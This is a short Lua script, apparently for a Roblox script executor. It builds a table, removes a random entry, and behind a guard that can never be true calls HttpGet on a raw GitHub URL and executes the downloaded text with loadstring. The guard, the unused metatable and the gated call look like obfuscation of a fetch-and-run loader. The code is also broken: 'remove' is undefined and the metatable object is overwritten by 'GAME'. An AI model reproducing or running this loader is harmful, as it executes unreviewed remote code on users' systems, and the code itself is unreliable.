local tbl2 = {}
for index = 1, 256 do
    tbl2[index] = index 
end
remove(tbl2, math.random(1, #tbl2))
if #tbl2 == 0 then
    local v12 = {}
    local tbl = setmetatable({}, { ["__index"] = v12, ["__metatable"] = nil })
    tbl = GAME
    loadstring(tbl.HttpGet(tbl, "https://raw.githubusercontent.com/GoofedLord/Ui/refs/heads/main/Ui%20you%20made%20it%20lets%20go"))()
end